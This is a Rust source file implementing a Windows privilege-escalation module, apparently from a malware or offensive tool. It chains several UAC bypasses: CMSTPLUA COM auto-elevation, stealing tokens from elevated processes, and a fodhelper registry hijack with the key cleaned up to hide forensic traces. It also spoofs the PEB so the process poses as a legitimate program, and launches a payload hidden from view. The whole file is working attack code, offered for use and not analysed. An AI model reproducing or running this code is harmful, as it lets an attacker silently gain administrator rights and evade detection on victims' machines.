#![allow(non_snake_case, non_upper_case_globals)]

//! Elevation Strategy: multi-technique UAC bypass with auto-degradation.
//!
//! Strategy chain (ordered by stealth):
//!   1. COM Auto-Elevation via CMSTPLUA ICMLuaUtil::ShellExec (no registry, no files)
//!   2. Token Stealing (DuplicateTokenEx from an elevated process)
//!   3. fodhelper.exe registry hijack (registry trace, cleaned up after use)
//!   4. ShellExecuteW runas (UAC prompt, last resort)
//!
//! Each strategy is attempted in order; on failure, falls back to the next.

use std::ptr;

// ── Public API ───────────────────────────────────────────────────────

/// Attempt to elevate the current process. Returns Ok(()) if already admin
/// or elevation succeeded. Returns Err if all strategies failed.
pub fn try_elevate(exe_path: &str) -> Result<(), ()> {
    if is_admin() {
        return Ok(());
    }

    // Strategy 1: COM Auto-Elevation via CMSTPLUA (silent, no registry writes)
    if cmstplua_elevate(exe_path).is_ok() {
        std::process::exit(0);
    }

    // Strategy 2: Token stealing from an elevated process (silent)
    if token_steal_elevate(exe_path).is_ok() {
        std::process::exit(0);
    }

    // Strategy 3: fodhelper.exe registry hijack (has registry trace, cleaned up)
    if fodhelper_elevate(exe_path).is_ok() {
        std::process::exit(0);
    }

    // Strategy 4: ShellExecuteW runas (shows UAC prompt)
    if runas_elevate(exe_path) {
        std::process::exit(0);
    }

    Err(())
}

// ── Strategy 1: COM Auto-Elevation via CMSTPLUA ─────────────────────
//
// Uses CoGetObject with the Elevation:Administrator moniker to obtain an
// ICMLuaUtil interface from the CMSTPLUA COM object (auto-elevating).
// Then calls ShellExec to spawn our payload elevated. No registry writes,
// no file operations — pure in-memory COM call.
//
// CLSID_CMSTPLUA: {3E5FC7F9-9A51-4367-9063-A120244FBEC7}
// IID_ICMLuaUtil: {6EDD6D74-C007-4E75-B76A-E5740995E24C}

fn cmstplua_elevate(exe_path: &str) -> Result<(), ()> {
    unsafe {
        // Initialize COM
        let hr = CoInitializeEx(ptr::null_mut(), COINIT_APARTMENTTHREADED);
        if hr < 0 && hr != RPC_E_CHANGED_MODE {
            return Err(());
        }

        // Create BIND_OPTS3 for elevation moniker
        let mut bind_opts: BIND_OPTS3 = std::mem::zeroed();
        bind_opts.cbStruct = std::mem::size_of::<BIND_OPTS3>() as u32;
        bind_opts.dwClassContext = CLSCTX_LOCAL_SERVER;

        // Elevation moniker for CMSTPLUA
        let moniker = to_wide("Elevation:Administrator!new:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}");

        // ICMLuaUtil vtable GUID
        let iid: GUID = GUID {
            Data1: 0x6EDD6D74,
            Data2: 0xC007,
            Data3: 0x4E75,
            Data4: [0xB7, 0x6A, 0xE5, 0x74, 0x09, 0x95, 0xE2, 0x4C],
        };

        let mut punk: *mut IUnknown = ptr::null_mut();

        // CoGetObject — this triggers the auto-elevation via the moniker
        let hr = CoGetObject(
            moniker.as_ptr(),
            &mut bind_opts as *mut BIND_OPTS3 as *mut BIND_OPTS,
            &iid,
            &mut punk as *mut *mut IUnknown as *mut *mut std::ffi::c_void,
        );

        if hr < 0 || punk.is_null() {
            CoUninitialize();
            return Err(());
        }

        // ICMLuaUtil vtable layout:
        // [0] QueryInterface
        // [1] AddRef
        // [2] Release
        // [3] SetRIFlags
        // [4] ShellExec
        // ...
        // ShellExec is at vtable index 4

        let vtable = *(punk as *const *const *const std::ffi::c_void);
        let shell_exec_addr = *vtable.add(4);

        type ShellExecFn = unsafe extern "system" fn(
            this: *mut IUnknown,
            lpFile: *const u16,
            lpParameters: *const u16,
            lpDirectory: *const u16,
            nShowCmd: u32,
        ) -> i32;

        let shell_exec: ShellExecFn = std::mem::transmute(shell_exec_addr);
        let exe_wide = to_wide(exe_path);
        let empty = to_wide("");

        let hr = shell_exec(
            punk,
            exe_wide.as_ptr(),
            empty.as_ptr(),
            ptr::null(),
            SW_HIDE,
        );

        // Release COM object
        let release_addr = *vtable.add(2);
        let release: unsafe extern "system" fn(*mut IUnknown) -> u32 = std::mem::transmute(release_addr);
        release(punk);

        CoUninitialize();

        if hr >= 0 { Ok(()) } else { Err(()) }
    }
}

// ── Strategy 2: Token Stealing ──────────────────────────────────────
//
// Find an elevated process, duplicate its token, and use it to spawn
// our payload. Uses DuplicateTokenEx + CreateProcessWithTokenW.

fn token_steal_elevate(exe_path: &str) -> Result<(), ()> {
    unsafe {
        let target_pid = find_elevated_process().ok_or(())?;

        let h_process = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, 0, target_pid);
        if h_process.is_null() {
            return Err(());
        }

        let mut h_token: *mut std::ffi::c_void = ptr::null_mut();
        if OpenProcessToken(h_process, TOKEN_DUPLICATE | TOKEN_QUERY, &mut h_token) == 0 {
            CloseHandle(h_process);
            return Err(());
        }

        let mut h_dup_token: *mut std::ffi::c_void = ptr::null_mut();
        let result = DuplicateTokenEx(
            h_token,
            TOKEN_ALL_ACCESS,
            ptr::null(),
            SecurityImpersonation,
            TokenImpersonation,
            &mut h_dup_token,
        );

        CloseHandle(h_token);
        CloseHandle(h_process);

        if result == 0 {
            return Err(());
        }

        let exe_wide = to_wide(exe_path);
        let mut si: STARTUPINFOW = std::mem::zeroed();
        si.cb = std::mem::size_of::<STARTUPINFOW>() as u32;
        let mut pi: PROCESS_INFORMATION = std::mem::zeroed();

        let create_result = CreateProcessWithTokenW(
            h_dup_token,
            0,
            ptr::null(),
            exe_wide.as_ptr() as *mut u16,
            CREATE_NO_WINDOW,
            ptr::null(),
            ptr::null(),
            &mut si,
            &mut pi,
        );

        CloseHandle(h_dup_token);

        if create_result != 0 {
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            Ok(())
        } else {
            Err(())
        }
    }
}

/// Enumerate processes to find one running elevated (admin).
unsafe fn find_elevated_process() -> Option<u32> {
    let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if snapshot == INVALID_HANDLE_VALUE {
        return None;
    }

    let mut pe: PROCESSENTRY32 = std::mem::zeroed();
    pe.dwSize = std::mem::size_of::<PROCESSENTRY32>() as u32;

    if Process32First(snapshot, &mut pe) != 0 {
        loop {
            let pid = pe.th32ProcessID;
            if pid != 0 && pid != 4 {
                let h_process = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, 0, pid);
                if !h_process.is_null() {
                    let mut h_token: *mut std::ffi::c_void = ptr::null_mut();
                    if OpenProcessToken(h_process, TOKEN_QUERY, &mut h_token) != 0 {
                        let mut elevation: TOKEN_ELEVATION = std::mem::zeroed();
                        let mut ret_len: u32 = 0;
                        let result = GetTokenInformation(
                            h_token,
                            TokenElevation,
                            &mut elevation as *mut TOKEN_ELEVATION as *mut std::ffi::c_void,
                            std::mem::size_of::<TOKEN_ELEVATION>() as u32,
                            &mut ret_len,
                        );
                        CloseHandle(h_token);
                        CloseHandle(h_process);

                        if result != 0 && elevation.TokenIsElevated != 0 {
                            CloseHandle(snapshot);
                            return Some(pid);
                        }
                    } else {
                        CloseHandle(h_process);
                    }
                }
            }

            if Process32Next(snapshot, &mut pe) == 0 {
                break;
            }
        }
    }

    CloseHandle(snapshot);
    None
}

// ── Strategy 3: fodhelper.exe Registry Hijack ────────────────────────
//
// fodhelper.exe auto-elevates without UAC prompt when a specific
// registry key is set. This leaves registry traces, so we clean up
// immediately after launching. Used only as fallback after CMSTPLUA
// and token stealing fail.

fn fodhelper_elevate(exe_path: &str) -> Result<(), ()> {
    use std::process::Command;
    use std::os::windows::process::CommandExt;

    let reg_key = "Software\\Classes\\ms-settings\\Shell\\Open\\command";
    let reg_path = format!("HKCU\\{}", reg_key);

    // Set the registry value
    let set_result = Command::new("reg")
        .args(["add", &reg_path, "/ve", "/t", "REG_SZ", "/d", exe_path, "/f"])
        .creation_flags(CREATE_NO_WINDOW)
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null())
        .status()
        .map_err(|_| ())?;

    if !set_result.success() {
        return Err(());
    }

    // Set DelegateExecute to empty (required for the bypass)
    let _ = Command::new("reg")
        .args(["add", &reg_path, "/v", "DelegateExecute", "/t", "REG_SZ", "/d", "", "/f"])
        .creation_flags(CREATE_NO_WINDOW)
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null())
        .status();

    // Launch the auto-elevating target
    let launch_result = Command::new("fodhelper.exe")
        .creation_flags(CREATE_NO_WINDOW)
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null())
        .status();

    // Immediately cleanup the registry key (minimize forensic footprint)
    let _ = Command::new("reg")
        .args(["delete", &reg_path, "/f"])
        .creation_flags(CREATE_NO_WINDOW)
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null())
        .status();

    match launch_result {
        Ok(s) if s.success() => Ok(()),
        _ => Err(()),
    }
}

// ── Strategy 4: ShellExecuteW runas ─────────────────────────────────

fn runas_elevate(exe_path: &str) -> bool {
    unsafe {
        let exe_wide = to_wide(exe_path);
        let verb = to_wide("runas");

        let result = ShellExecuteW(
            ptr::null_mut(),
            verb.as_ptr(),
            exe_wide.as_ptr(),
            ptr::null(),
            ptr::null(),
            SW_SHOWNORMAL,
        );
        result > 32
    }
}

// ── Admin Check ─────────────────────────────────────────────────────

pub fn is_admin() -> bool {
    use std::os::windows::process::CommandExt;
    std::process::Command::new("net")
        .args(["session"])
        .creation_flags(CREATE_NO_WINDOW)
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null())
        .status()
        .map(|s| s.success())
        .unwrap_or(false)
}

// ── PEB Spoofing ────────────────────────────────────────────────────

/// Spoof the PEB ImagePathName and CommandLine to appear as a legitimate process.
pub fn spoof_peb(fake_name: &str) {
    #[cfg(target_os = "windows")]
    unsafe {
        let peb: *mut u8;
        std::arch::asm!("mov {}, gs:[0x60]", out(reg) peb);
        if peb.is_null() { return; }

        let process_params = *(peb.add(0x20) as *const *mut u8);
        if process_params.is_null() { return; }

        let image_path = process_params.add(0x60) as *mut UnicodeString;
        let command_line = process_params.add(0x70) as *mut UnicodeString;

        let fake_wide = to_wide(fake_name);

        if !(*image_path).Buffer.is_null() {
            let copy_len = (fake_wide.len() * 2).min((*image_path).MaximumLength as usize);
            ptr::copy_nonoverlapping(fake_wide.as_ptr(), (*image_path).Buffer, copy_len / 2);
            (*image_path).Length = copy_len as u16;
        }

        if !(*command_line).Buffer.is_null() {
            let copy_len = (fake_wide.len() * 2).min((*command_line).MaximumLength as usize);
            ptr::copy_nonoverlapping(fake_wide.as_ptr(), (*command_line).Buffer, copy_len / 2);
            (*command_line).Length = copy_len as u16;
        }
    }
}

// ── Helpers ─────────────────────────────────────────────────────────

fn to_wide(s: &str) -> Vec<u16> {
    s.encode_utf16().chain(std::iter::once(0)).collect()
}

// ── Windows Types & Constants ───────────────────────────────────────

const CREATE_NO_WINDOW: u32 = 0x08000000;
const SW_HIDE: u32 = 0;
const SW_SHOWNORMAL: i32 = 1;
const COINIT_APARTMENTTHREADED: u32 = 0x2;
const CLSCTX_LOCAL_SERVER: u32 = 0x4;
const RPC_E_CHANGED_MODE: i32 = 0x80010106u32 as i32;
const PROCESS_QUERY_LIMITED_INFORMATION: u32 = 0x1000;
const TOKEN_QUERY: u32 = 0x0008;
const TOKEN_DUPLICATE: u32 = 0x0002;
const TOKEN_ALL_ACCESS: u32 = 0x001F01FF;
const SecurityImpersonation: i32 = 2;
const TokenImpersonation: i32 = 2;
const TokenElevation: i32 = 18;
const TH32CS_SNAPPROCESS: u32 = 0x00000002;
const INVALID_HANDLE_VALUE: *mut std::ffi::c_void = -1isize as *mut std::ffi::c_void;

#[repr(C)]
struct GUID {
    Data1: u32,
    Data2: u16,
    Data3: u16,
    Data4: [u8; 8],
}

#[repr(C)]
struct BIND_OPTS {
    cbStruct: u32,
    grfFlags: u32,
    grfMode: u32,
    dwTickCountDeadline: u32,
}

#[repr(C)]
struct BIND_OPTS3 {
    cbStruct: u32,
    grfFlags: u32,
    grfMode: u32,
    dwTickCountDeadline: u32,
    dwTrackFlags: u32,
    dwClassContext: u32,
    locale: u32,
    pServerInfo: *mut std::ffi::c_void,
    hwnd: *mut std::ffi::c_void,
}

#[repr(C)]
struct IUnknown {
    _vtable: *const *const std::ffi::c_void,
}

#[repr(C)]
struct UnicodeString {
    Length: u16,
    MaximumLength: u16,
    Buffer: *mut u16,
}

#[repr(C)]
struct STARTUPINFOW {
    cb: u32,
    _reserved: *mut u16,
    _desktop: *mut u16,
    _title: *mut u16,
    _x: u32, _y: u32, _x_size: u32, _y_size: u32,
    _x_count_chars: u32, _y_count_chars: u32,
    _fill_attribute: u32,
    _flags: u32,
    _show_window: u16,
    _cb_reserved2: u16,
    _lp_reserved2: *mut u8,
    _h_std_input: *mut std::ffi::c_void,
    _h_std_output: *mut std::ffi::c_void,
    _h_std_error: *mut std::ffi::c_void,
}

#[repr(C)]
struct PROCESS_INFORMATION {
    hProcess: *mut std::ffi::c_void,
    hThread: *mut std::ffi::c_void,
    dwProcessId: u32,
    dwThreadId: u32,
}

#[repr(C)]
struct PROCESSENTRY32 {
    dwSize: u32,
    cntUsage: u32,
    th32ProcessID: u32,
    _th32DefaultHeapID: usize,
    th32ModuleID: u32,
    cntThreads: u32,
    th32ParentProcessID: u32,
    _pcPriClassBase: i32,
    _dwFlags: u32,
    szExeFile: [u16; 260],
}

#[repr(C)]
struct TOKEN_ELEVATION {
    TokenIsElevated: u32,
}

extern "system" {
    fn CoInitializeEx(pvReserved: *mut std::ffi::c_void, dwCoInit: u32) -> i32;
    fn CoUninitialize();
    fn CoGetObject(
        pwszName: *const u16,
        pBindOptions: *mut BIND_OPTS,
        riid: *const GUID,
        ppv: *mut *mut std::ffi::c_void,
    ) -> i32;

    fn ShellExecuteW(
        hwnd: *mut std::ffi::c_void,
        lpOperation: *const u16,
        lpFile: *const u16,
        lpParameters: *const u16,
        lpDirectory: *const u16,
        nShowCmd: i32,
    ) -> usize;

    fn OpenProcess(dwDesiredAccess: u32, bInheritHandle: i32, dwProcessId: u32) -> *mut std::ffi::c_void;
    fn CloseHandle(hObject: *mut std::ffi::c_void) -> i32;
    fn OpenProcessToken(
        ProcessHandle: *mut std::ffi::c_void,
        DesiredAccess: u32,
        TokenHandle: *mut *mut std::ffi::c_void,
    ) -> i32;
    fn DuplicateTokenEx(
        hExistingToken: *mut std::ffi::c_void,
        dwDesiredAccess: u32,
        lpTokenAttributes: *const std::ffi::c_void,
        ImpersonationLevel: i32,
        TokenType: i32,
        phNewToken: *mut *mut std::ffi::c_void,
    ) -> i32;
    fn CreateProcessWithTokenW(
        hToken: *mut std::ffi::c_void,
        dwLogonFlags: u32,
        lpApplicationName: *const u16,
        lpCommandLine: *mut u16,
        dwCreationFlags: u32,
        lpEnvironment: *const std::ffi::c_void,
        lpCurrentDirectory: *const u16,
        lpStartupInfo: *const STARTUPINFOW,
        lpProcessInformation: *mut PROCESS_INFORMATION,
    ) -> i32;
    fn GetTokenInformation(
        TokenHandle: *mut std::ffi::c_void,
        TokenInformationClass: i32,
        TokenInformation: *mut std::ffi::c_void,
        TokenInformationLength: u32,
        ReturnLength: *mut u32,
    ) -> i32;
    fn CreateToolhelp32Snapshot(dwFlags: u32, th32ProcessID: u32) -> *mut std::ffi::c_void;
    fn Process32First(hSnapshot: *mut std::ffi::c_void, lppe: *mut PROCESSENTRY32) -> i32;
    fn Process32Next(hSnapshot: *mut std::ffi::c_void, lppe: *mut PROCESSENTRY32) -> i32;
}
